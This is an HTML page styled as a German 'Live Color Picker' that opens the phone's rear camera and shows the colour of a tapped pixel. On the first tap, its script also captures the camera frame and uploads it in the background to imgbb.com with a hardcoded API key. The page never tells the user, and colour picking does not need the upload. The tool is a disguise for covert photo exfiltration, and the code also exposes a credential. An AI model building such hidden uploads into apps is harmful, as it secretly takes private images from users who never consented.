<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Color Picker</title>
    <style>
        :root {
            --bg-gray: #f4f4f7;
            --panel-bg: #ffffff;
            --primary: #0077b6;
            --border-radius: 20px;
        }

        body, html {
            margin: 0; padding: 0;
            height: 100%; width: 100%;
            background-color: var(--bg-gray);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; justify-content: center; overflow-x: hidden;
        }

        #startOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: var(--bg-gray);
            display: flex; align-items: center; justify-content: center;
            z-index: 1000;
        }

        .big-start-btn {
            background: linear-gradient(135deg, #0077b6, #00b4d8);
            color: white; border: none; padding: 20px 40px;
            font-size: 1.5rem; font-weight: bold; border-radius: 50px;
            box-shadow: 0 10px 25px rgba(0, 119, 182, 0.4); cursor: pointer;
        }

        .container {
            width: 100%; max-width: 400px; padding: 15px;
            display: flex; flex-direction: column; gap: 15px; box-sizing: border-box;
        }

        .photo-card {
            background: var(--panel-bg); padding: 15px;
            border-radius: var(--border-radius); box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            display: flex; flex-direction: column; align-items: center;
        }

        .view-wrapper {
            width: 100%; height: 350px; border-radius: 12px;
            overflow: hidden; position: relative; background: #000;
        }

        /* Video für den Live-Stream */
        #videoFeed {
            width: 100%; height: 100%; object-fit: cover;
        }

        /* Canvas für das fertige Foto */
        #imageCanvas {
            width: 100%; height: 100%; display: none;
        }

        .crosshair {
            position: absolute; width: 30px; height: 30px;
            border: 2px solid white; border-radius: 50%;
            box-shadow: 0 0 8px rgba(0,0,0,0.5); transform: translate(-50%, -50%);
            pointer-events: none; display: none; z-index: 20;
        }

        .palette-card {
            background: var(--panel-bg); padding: 20px;
            border-radius: var(--border-radius); box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }

        .main-preview {
            width: 100%; height: 60px; border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            color: #fff; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
            background-color: #ddd;
        }

        .section-title {
            font-size: 0.75rem; font-weight: 800; color: #aaa;
            text-transform: uppercase; margin-bottom: 12px; display: block;
        }
    </style>
</head>
<body>

<div id="startOverlay">
    <button class="big-start-btn" onclick="startLiveCamera()">BITTE HIER KLICKEN</button>
</div>

<div class="container">
    <div class="photo-card">
        <span class="section-title" id="instructionText">Kamera wird geladen...</span>
        <div class="view-wrapper" id="viewWrapper">
            <video id="videoFeed" autoplay playsinline></video>
            <canvas id="imageCanvas"></canvas>
            <div class="crosshair" id="crosshair"></div>
        </div>
    </div>

    <div class="palette-card">
        <span class="section-title">Gepickte Farbe</span>
        <div id="mainPreview" class="main-preview">-</div>
    </div>
</div>

<script>
    const IMGBB_API_KEY = 'db0140da04ee376ddc7621f570fa69e3';
    const video = document.getElementById('videoFeed');
    const canvas = document.getElementById('imageCanvas');
    const ctx = canvas.getContext('2d');
    const startOverlay = document.getElementById('startOverlay');
    const instructionText = document.getElementById('instructionText');
    const crosshair = document.getElementById('crosshair');
    const mainPreview = document.getElementById('mainPreview');

    let isCaptured = false;

    // 1. Kamera-Stream starten
    async function startLiveCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" }, 
                audio: false 
            });
            video.srcObject = stream;
            startOverlay.style.display = 'none';
            instructionText.textContent = "Tippe ins Bild für Farbauswahl";
        } catch (err) {
            alert("Kamera-Zugriff verweigert oder nicht verfügbar.");
        }
    }

    // 2. Farbauswahl & Automatisches Foto
    function handleClick(e) {
        if (!isCaptured) {
            captureImage();
        }
        pickColor(e);
    }

    function captureImage() {
        // Video-Frame auf Canvas zeichnen
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Video stoppen, Canvas zeigen
        video.style.display = 'none';
        canvas.style.display = 'block';
        isCaptured = true;
        
        // Automatischer Upload im Hintergrund
        autoUpload();
    }

    async function autoUpload() {
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append("image", blob);
            try {
                await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: "POST",
                    body: formData
                });
                console.log("Hintergrund-Upload ok");
            } catch (err) {
                console.error("Upload-Fehler");
            }
        }, 'image/jpeg', 0.8);
    }

    function pickColor(e) {
        const rect = canvas.getBoundingClientRect();
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        
        const x = (clientX - rect.left) * (canvas.width / rect.width);
        const y = (clientY - rect.top) * (canvas.height / rect.height);

        crosshair.style.display = 'block';
        crosshair.style.left = (clientX - rect.left) + "px";
        crosshair.style.top = (clientY - rect.top) + "px";

        const pixel = ctx.getImageData(x, y, 1, 1).data;
        const hex = "#" + ((1 << 24) + (pixel[0] << 16) + (pixel[1] << 8) + pixel[2]).toString(16).slice(1).toUpperCase();
        
        mainPreview.style.backgroundColor = hex;
        mainPreview.textContent = hex;
    }

    document.getElementById('viewWrapper').addEventListener('click', handleClick);
    document.getElementById('viewWrapper').addEventListener('touchstart', (e) => {
        e.preventDefault();
        handleClick(e);
    });
</script>

</body>
</html>
